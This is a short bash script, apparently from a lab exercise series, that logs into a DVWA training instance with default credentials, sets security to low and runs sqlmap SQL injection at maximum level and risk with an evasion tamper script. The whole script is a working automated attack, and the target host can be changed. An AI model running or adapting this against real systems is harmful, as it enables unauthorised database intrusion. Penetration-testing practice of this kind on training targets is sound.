k#!/bin/bash

# Play 03 — SQLMap DVWA em produção
# Autentica no DVWA e roda sqlmap corretamente, usando --cookie e auto-follow redirects

# Define host DVWA (sem porta)
TARGET_HOST="${DVWA_HOST:-web-dvwa-production.up.railway.app}"

echo "[*] Autenticando no DVWA em http://$TARGET_HOST/login.php..."

# Resolve path absoluto do script e diretório
SCRIPT_PATH="$(readlink -f "${BASH_SOURCE[0]}")"
SCRIPT_DIR="$(dirname "$SCRIPT_PATH")"
COOKIE_FILE="$SCRIPT_DIR/cookies.txt"

# 1. Login e captura cookies (segue redirect)
curl -s -c "$COOKIE_FILE" -L \
  -d "username=admin&password=password&Login=Login" \
  "http://$TARGET_HOST/login.php" > /dev/null

echo "[*] Definindo segurança para LOW..."
curl -s -b "$COOKIE_FILE" -L \
  "http://$TARGET_HOST/security.php?security=low" > /dev/null

# 2. Extrai valor do PHPSESSID do cookie file
PHPSESSID=$(grep -E 'PHPSESSID' "$COOKIE_FILE" | awk '{print $7}')
COOKIE="security=low; PHPSESSID=$PHPSESSID"

# URL de injeção
INJECTION_URL="http://$TARGET_HOST/dvwa/vulnerabilities/sqli/?id=1&Submit=Submit"
echo "[*] Iniciando análise SQL Injection com sqlmap contra $INJECTION_URL..."

# Executa sqlmap com nível, risco e tamper para contornar proteções
sqlmap \
  -u "$INJECTION_URL" \
  --cookie "$COOKIE" \
  --batch \
  --answers="redirect=Y" \
  --level=5 \
  --risk=3 \
  --tamper=space2comment

# Mensagem de fim de teste
echo "[✓] Análise SQLi concluída."

